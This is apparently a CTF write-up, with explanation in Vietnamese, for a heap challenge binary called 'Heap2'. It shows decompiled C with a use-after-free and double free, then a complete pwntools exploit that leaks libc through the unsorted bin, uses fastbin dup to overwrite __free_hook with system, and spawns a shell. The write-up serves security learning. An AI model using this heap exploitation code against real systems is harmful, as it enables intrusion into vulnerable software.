# Heap2

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initState(argc, argv, envp);
  puts("Ez heap challange !");
  while ( 1 )
  {
    menu();
    switch ( (unsigned int)readInt() )
    {
      case 1u:
        createHeap();
        break;
      case 2u:
        showHeap();
        break;
      case 3u:
        editHeap();
        break;
      case 4u:
        deleteHeap(0LL);
        break;
      case 5u:
        exit(0);
      default:
        puts("no option");
        break;
    }
  }
}
```

```c
__int64 deleteHeap()
{
  unsigned int Int; // [rsp+Ch] [rbp-4h]

  printf("Input index:");
  Int = readInt();
  if ( Int >= 0xA )
    exit(0);
  if ( store[Int] )
  {
    free((void *)store[Int]);
    puts("Done ");
  }
  return 0LL;
}
```

## Vulnerability

Trong hàm delete, sau khi free chương trình ko hề set con trỏ thành null. Dẫn đến lỗi use after free. Cùng với đó là lỗi double free.

## Exploit

Vì có uaf nên mình sử dụng unsorted bin để leak địa chỉ main_arena, từ đó có được địa chỉ libc. Sau đó sử dụng fastbin dup. Tuy nhiên, với fastbin ta phải thỏa mãn điều kiện về trường `size` của chunk. Mà trước địa chỉ của `__free_hook` là 1 vùng nhớ rất lớn chỉ gồm null byte. Vì vậy mình sẽ lại dùng uaf để overwrite con trỏ BK của unsorted bin chunk. Từ đó để ghi địa chỉ main arena vào một địa chỉ gần với `__free_hook`

```python
p = start()
libc = ELF('./libc.2.23.so')

def create(idx,size,data):
    p.sendafter(b'>\n',b'1')
    p.sendafter(b'Index:',str(idx).encode())
    p.sendafter(b'size:',str(size).encode())
    p.sendafter(b'Input data:',data)

def show(idx):
    p.sendafter(b'>\n',b'2')
    p.sendafter(b'Index:',str(idx).encode())
    p.recvuntil(b'Data = ')
    return p.recvline()

def edit(idx,data):
    p.sendafter(b'>\n',b'3')
    p.sendafter(b'index:',str(idx).encode())
    p.send(data)

def delete(idx):
    p.sendafter(b'>\n',b'4')
    p.sendafter(b'index:',str(idx).encode())

# leak libc with unsorted bin 
create(0,400,b'a')
create(1,500,b'a')  # prevent consolidate
delete(0)

## use after free to leak main_arena
libc.address = u64(show(0).strip().ljust(8,b'\x00')) -  0x39bb78
log.info('libc.address: ' + hex(libc.address))
__free_hook = libc.symbols['__free_hook']
log.info('__free_hook: ' + hex(__free_hook))
system = libc.symbols['system']
log.info('system: ' + hex(system))

create(0,400,b'a')


# fastbin dup
create(2,0x68,b'a')
create(3,0x68,b'a')

delete(2)
delete(3)
delete(2)

create(4,0x68,p64(__free_hook - 0x19))
create(5,0x68,b'/bin/sh\x00')
create(6,0x68,b'a')
## next 0x68 fastbin chunk will be at __free_hook - 0x19

create(0,400,b'a')
create(1,500,b'a')
delete(0)
edit(0,p64(0) + p64(__free_hook - 0x10 - 0x16)) # overwrite bk of unsorted bin chunk


# write to near __free_hook
create(0,400,b'a')

# now malloc will return __free_hook - 0x19
create(7,0x68,cyclic(9) + p64(system))

## trigger free
delete(5)
 
p.interactive()
```